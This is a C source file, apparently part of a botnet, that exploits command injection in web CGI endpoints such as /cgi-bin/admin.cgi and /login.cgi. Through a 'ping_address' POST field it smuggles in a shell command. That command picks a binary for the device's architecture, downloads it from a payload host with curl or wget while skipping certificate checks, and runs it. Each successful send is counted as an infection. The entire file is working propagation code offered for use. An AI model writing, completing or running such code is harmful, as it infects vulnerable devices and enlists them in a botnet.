#include "../../include/botnet.h"
#include "../../include/config.h" // Solución: Inclusión directa de la configuración

// A list of common vulnerable CGI endpoints
static const char *cgi_paths[] = {"/cgi-bin/admin.cgi", "/api/submit", "/login.cgi"};
static const int num_cgi_paths = sizeof(cgi_paths) / sizeof(char *);

// Attempts to exploit a command injection vulnerability by delivering the secure loader command
void exploit_web_command_injection(struct target *t) {
    printf("[*] Attempting command injection exploit on %s:%d\n", inet_ntoa(*(struct in_addr *)&t->addr), ntohs(t->port));

    // Construct the multi-arch, HTTPS-based loader command
    char loader_cmd[1024];
    snprintf(loader_cmd, sizeof(loader_cmd),
             "ARCH=$(uname -m); case $ARCH in arm*) DIR=\"arm\";; mips*) DIR=\"mips\";; x86_64) DIR=\"x86_64\";; *) exit;; esac; cd /tmp; (curl -kfsSL https://%s:443/$DIR/bot -o bot || wget --no-check-certificate -qO- https://%s:443/$DIR/bot > bot); chmod +x bot; ./bot &",
             PAYLOAD_HOST, PAYLOAD_HOST);

    for (int i = 0; i < num_cgi_paths; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        struct sockaddr_in target_addr = { .sin_family = AF_INET, .sin_port = t->port, .sin_addr.s_addr = t->addr };

        if (connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0) {
            close(sock);
            continue;
        }

        // Construct the malicious HTTP POST request
        char http_req[2048];
        char post_data[1500]; // Ensure enough space for the loader command
        snprintf(post_data, sizeof(post_data), "ping_address=127.0.0.1;%s", loader_cmd);

        snprintf(http_req, sizeof(http_req),
                 "POST %s HTTP/1.1\r\n"
                 "Host: %s\r\n"
                 "Content-Type: application/x-www-form-urlencoded\r\n"
                 "Content-Length: %ld\r\n\r\n"
                 "%s",
                 cgi_paths[i], inet_ntoa(target_addr.sin_addr),
                 strlen(post_data), post_data);

        if (send(sock, http_req, strlen(http_req), 0) > 0) {
            increment_infection_counter();
        }
        close(sock);
        sleep(1);
    }
}
